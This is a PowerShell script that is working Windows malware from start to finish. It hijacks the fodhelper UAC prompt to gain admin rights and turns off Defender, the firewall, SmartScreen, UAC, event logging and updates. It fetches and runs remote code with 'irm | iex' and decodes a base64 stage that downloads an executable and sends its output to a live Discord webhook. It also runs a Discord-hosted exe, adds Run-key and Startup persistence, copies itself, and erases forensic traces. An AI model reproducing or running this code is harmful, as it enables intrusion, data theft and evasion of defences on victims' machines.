
$ErrorActionPreference = "SilentlyContinue";


$ScriptPath = $MyInvocation.MyCommand.Path;
$ExePath = (Get-Process -Id $PID).Path;
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath };
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\';


function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
}


function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath));
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw);
        (Get-Item $replicated).Attributes = 'Hidden';
    }
}


function Invoke-SelfDestruction {
    
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force;

    
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force;
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath);
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf";
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force;
        }
    }


    
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) };
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force;
        }
    }

    
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force;
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden;
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force;
    }
}


function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties;
    )

    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null;
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force;
    }
}


if (-not (Test-Admin)) {
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`"";
    
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`"";
    }

    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null;
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force,
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null;

    
    Start-Process "fodhelper.exe" -WindowStyle Hidden;

    
    exit;
}


$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";
$realTimeProtectionKey = "$baseKey\Real-Time Protection";
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy";

Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0};
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1};

Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1 ;
    "DisableApplicationGuard" = 1;
    "DisableControlledFolderAccess" = 1;
    "DisableCredentialGuard" = 1;
    "DisableIntrusionPreventionSystem" = 1;
    "DisableIOAVProtection" = 1;
    "DisableRealtimeMonitoring" = 1;
    "DisableRoutinelyTakingAction" = 1;
    "DisableSpecialRunningModes" = 1;
    "DisableTamperProtection" = 1;
    "PUAProtection" = 0;
    "ServiceKeepAlive" = 0;
}

Set-RegistryProperties -path $realTimeProtectionKey -properties @{
    "DisableBehaviorMonitoring" = 1;
    "DisableBlockAtFirstSeen" = 1;
    "DisableCloudProtection" = 1;
    "DisableOnAccessProtection" = 1;
    "DisableScanOnRealtimeEnable" = 1;
    "DisableScriptScanning" = 1;
    "SubmitSamplesConsent" = 2;
}

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;


Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;


Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};
Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};
Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1};

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force;
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0};
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1};
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1};

Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0};
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0};

Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0};

Set-ExecutionPolicy Unrestricted -Force; Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled;

irm https://rb.gy/xzpj1d | iex;

$webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
$version = "2.4.6";
$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCmlmICgtbm90ICR2ZXJzaW9uKSB7DQogICR2ZXJzaW9uID0gIjIuNC41Ig0KfQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQokbmV4dGRvb3IgPSAiZ2l0aHViLmNvbSINCiR2ZXJtID0gInYkdmVyc2lvbiINCiRjdXBpZCA9ICJUaGUgTEFaeSBtYWpvciB3YXMgZml4aW5nIEN1cGlk4oCZcyBicm9rZW4gcXVpdmVyLiINCiRsYXp5ID0gIlF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZy4iDQokZXggPSAiLmV4ZSINCiRhID0gIjoiDQokYiA9ICIvIg0KJGMgPSAkY3VwaWQuU3Vic3RyaW5nKDEsMSkNCiRkID0gJGxhenkuU3Vic3RyaW5nKDI3LDEpDQokZSA9ICRjdXBpZC5TdWJzdHJpbmcoMjgsMSkNCiRmID0gJGN1cGlkLlN1YnN0cmluZygxNywxKQ0KJGcgPSAkY3VwaWQuU3Vic3RyaW5nKDUsMSkNCiRoID0gJGxhenkuU3Vic3RyaW5nKDMxLDEpDQokaSA9ICRjdXBpZC5TdWJzdHJpbmcoMiwxKQ0KJGogPSAkbGF6eS5TdWJzdHJpbmcoMzIsMSkNCiRrID0gJGxhenkuU3Vic3RyaW5nKDEwLDEpDQokbCA9ICRjdXBpZC5TdWJzdHJpbmcoMzAsMSkNCiRtID0gJGxhenkuU3Vic3RyaW5nKDcsMSkNCiRuID0gJGxhenkuU3Vic3RyaW5nKDgsMSkNCiRvID0gJGN1cGlkLlN1YnN0cmluZyg2LDEpDQokcCA9ICRjdXBpZC5TdWJzdHJpbmcoNCwxKQ0KJHEgPSAkY3VwaWQuU3Vic3RyaW5nKDI0LDEpDQokciA9ICRsYXp5LlN1YnN0cmluZyg5LDEpDQokZGVtb24gPSAiJGMkZCRkJGUkZiRhJGIkYiRuZXh0ZG9vciRiIg0KJGFuZ2VsID0gIiRnJGgkaSRmJGYkaiRrJGwkbSRuJG8kYiRwJGokbyRqJHEkayRpJGIkbSRpJGgkaSRqJGYkaSRmJGIkbCRuJHIkayRoJG4kaiRsJGIiDQokaHVtYW4gPSAiJHZlcm0kYiRwJGokbyRqJHEkayRpJGV4Ig0KJHplbGRhID0gIiRkZW1vbiRhbmdlbCRodW1hbiIgfCBPdXQtU3RyaW5nDQpXcml0ZS1Ib3N0ICR6ZWxkYQ0KaWYgKCRBZG1pbiAtZXEgJ1RydWUnKSB7DQogIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUNCg0KICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KfQ0KJGhpZGUgPSBHZXQtSXRlbSAiJGRpciIgLUZvcmNlDQokaGlkZS5hdHRyaWJ1dGVzPSdIaWRkZW4nDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkemVsZGEiIC1PdXRGaWxlICIkZGlyXGxhemFnbmUuZXhlIg0KJiAiJGRpclxsYXphZ25lLmV4ZSIgYWxsID4gIiRsb2ciDQpjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIk5ldyBGaWxlIFVwbG9hZGVkYCFcbihBZG1pbjogJEFkbWluKSBcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIwDQppZiAoJEFkbWluIC1lcSAnVHJ1ZScpew0KICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZQ0KDQogIFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIiRkaXIiDQp9DQokdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJHVuaGlkZS5hdHRyaWJ1dGVzPSdOb3JtYWwnDQpSZW1vdmUtSXRlbSAtUGF0aCAiJGRpciIgLVJlY3Vyc2UgLUZvcmNl > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1";

Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";

function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
    $name = "DistopiaPersistence";
    $value = "$env:TEMP\distopi.exe";
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null;
    }
    Set-ItemProperty -Path $regPath -Name $name -Value $value;
}

function Add-StartupFolderPersistence {
    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk");
    $shell = New-Object -ComObject WScript.Shell;
    $shortcut = $shell.CreateShortcut($startupPath);
    $shortcut.TargetPath = "$env:TEMP\distopi.exe";
    $shortcut.Save();
}

Add-RegistryPersistence;
Add-StartupFolderPersistence;

Invoke-SelfReplication;

Invoke-SelfDestruction;


exit;
